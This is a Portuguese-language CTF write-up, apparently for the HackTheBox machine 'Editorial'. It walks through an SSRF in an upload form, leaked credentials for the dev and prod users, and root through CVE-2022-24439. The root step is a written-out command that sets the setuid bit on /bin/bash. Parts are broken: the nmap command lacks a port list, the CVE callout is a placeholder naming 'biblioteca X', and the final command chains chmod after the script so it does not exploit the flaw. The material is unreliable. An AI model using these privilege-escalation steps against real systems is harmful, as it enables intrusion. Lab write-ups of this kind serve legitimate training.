---
layout: post  
title: "Editorial - HackThebox Season 6"  
date: 2024-10-19  
categories: [Hackthebox, CTF, SSRF]  
tags: [Hackthebox, CTF, SSRF]  
---

**Dificuldade**: Fácil

## Reconhecimento

Comecei com um scan básico de portas utilizando o **nmap** para identificar os serviços expostos pela máquina.

> Iniciei com um scan básico de portas utilizando o nmap:
> 
> 
> `nmap -vvv -p 10.10.11.20 -sCV -Pn -T4 --min-rate 10000 -oN nma/tcp_default`
> 

```bash
PORT   STATE SERVICE REASON  VERSION                                                                        
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)                   
| ssh-hostkey:                                                                                              
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)                                             
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2Jy
CHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=                                                      
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)                                           
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx                          
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)                                                          
| http-methods:                                                                                             
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enquanto isso, também realizei um fuzzing de diretórios e procurei por vhosts, mas sem sucesso.

## Enumeração

Com base nos serviços descobertos, iniciei a enumeração:

Comecei pelo servidor web e procurei por algo que não fosse estático. Encontrei um pagina de upload:

![image.png](https://file.notion.so/f/f/741683d4-87d3-4e6a-b984-48bdf6870242/0eec0986-71ed-46c3-bae4-c54d8668791c/image.png?table=block&id=29bb5c29-426f-484e-b334-1ad51efee56c&spaceId=741683d4-87d3-4e6a-b984-48bdf6870242&expirationTimestamp=1729728000000&signature=2Opuo3e7zlTCug6cVD9IC8RZH4HBYE51o6WQouzgqrQ&downloadName=image.png)

## Ganho de Acesso Inicial

Depois de algum tempo testando, encontrei um SSRF no parâmetro **bookurl**, onde eu conseguia fazer requisições para minha máquina atacante. Além de forjar uma requisição, eu também conseguia ler a resposta, que era colocada em um arquivo.

💻 **SSRF (Server-Side Request Forgery)**

SSRF permite que um atacante faça requisições HTTP arbitrárias a partir do servidor da vítima, muitas vezes com o objetivo de acessar recursos internos da rede.

![image.png](https://file.notion.so/f/f/741683d4-87d3-4e6a-b984-48bdf6870242/a175d039-9ee1-4d4b-9463-e14e36ceed1e/image.png?table=block&id=532e3a79-3b33-428f-98a0-3663a85fba07&spaceId=741683d4-87d3-4e6a-b984-48bdf6870242&expirationTimestamp=1729728000000&signature=LhyxxMgN2eHyChwTLe5DICVFsZPNCy0zxoQTgVaiUsU&downloadName=image.png)

Então, fui tentando algumas coisas e, ao tentar me conectar com portas locais da máquina, obtive sucesso. Comecei a enviar requisições localmente para portas mais conhecidas e acabei encontrando a porta 5000.

![image.png](https://file.notion.so/f/f/741683d4-87d3-4e6a-b984-48bdf6870242/51faa8bc-69f8-417f-bddc-c0b625416d03/image.png?table=block&id=5d828884-5703-4b1e-80e1-1203c4c75811&spaceId=741683d4-87d3-4e6a-b984-48bdf6870242&expirationTimestamp=1729728000000&signature=8p4QzxXKGY-AkRg1EWnGprMcxcypLwwNASGAf6pqwJ0&downloadName=image.png)

Ao abrir a resposta recebida, encontrei alguns endpoints:

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

Então, fiz requisições para cada um deles, até chegar no "**/api/latest/metadata/messages/authors**", onde, ao fazer uma requisição, encontrei credenciais:

**dev:dev080217_devAPI!@**

```json
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

A primeira coisa que fiz ao pegar as credenciais foi tentar logar no SSH, e obtive sucesso.

![image.png](https://file.notion.so/f/f/741683d4-87d3-4e6a-b984-48bdf6870242/e2f0a135-3a59-4c02-abce-6c9e27e9121e/image.png?table=block&id=3c921e3d-e133-4c57-b879-3a4775a36992&spaceId=741683d4-87d3-4e6a-b984-48bdf6870242&expirationTimestamp=1729728000000&signature=OwZBSVAfb65ZnmzA0BrK7sLEutVT-2WwT-xoaXvJLDI&downloadName=image.png)

## Escalada de Privilégios - prod

No diretório do usuário **dev**, existe uma pasta **app**, mas ela é muito estranha, pois só existe um arquivo **.git**. Então comecei a interagir com esse **.git** e encontrei uma credencial no commit **b73481bb**. Ao dar um `git show` nele, peguei a senha de **prod**:

**prod:080217_Producti0n_2023!@**

```bash
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+  
```

Então usei `su` para logar como o usuário **prod** e obtive sucesso.

![image.png](https://file.notion.so/f/f/741683d4-87d3-4e6a-b984-48bdf6870242/29ddca55-0891-4e18-9bdc-3f453419bde8/image.png?table=block&id=8238fa64-5120-4fa8-9002-f4c0218c5266&spaceId=741683d4-87d3-4e6a-b984-48bdf6870242&expirationTimestamp=1729728000000&signature=SZb4xBse1PVwE0EmzGEBCN6At_yZ_HDe86iEqIoA70s&downloadName=image.png)

## Escalada de Privilégios - root

A primeira coisa que fiz ao obter acesso ao usuário **prod** foi verificar as permissões de **sudo** com o comando:.

![image.png](https://file.notion.so/f/f/741683d4-87d3-4e6a-b984-48bdf6870242/76dd8087-c570-45d0-b5ac-97c0cce04c09/image.png?table=block&id=9b9c675c-d4d3-4ddb-abe8-80d413e32975&spaceId=741683d4-87d3-4e6a-b984-48bdf6870242&expirationTimestamp=1729728000000&signature=43zvd77cLL0pXBmmeohr5OS9Y7coAcNOUZnKVqv5qbU&downloadName=image.png)

Ao revisar o conteúdo do script **clone_prod_change.py**, notei que ele fazia uso de uma biblioteca desconhecida. Com isso, fui em busca de vulnerabilidades associadas a essa biblioteca e descobri a [CVE-2022-24439](https://www.cve.org/CVERecord?id=CVE-2022-24439), uma vulnerabilidade de execução remota de código (RCE).

<aside>
💡 CVE-2022-24439: "Essa vulnerabilidade explora uma falha na biblioteca X, permitindo que um atacante execute comandos remotamente devido a uma má validação de entradas."

</aside>

Com base nessa vulnerabilidade, consegui explorá-la e ganhar controle sobre a execução do script, o que me permitiu executar comandos arbitrários.

Para explorar essa falha, utilizei o seguinte comando:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py; /bin/bash -c "chmod +s /bin/bash"
```

Após executar esse comando, bastou rodar **bash -p** para obter privilégios elevados:

```bash
bash -p
```

Com isso, consegui acessar o usuário **root** na máquina.
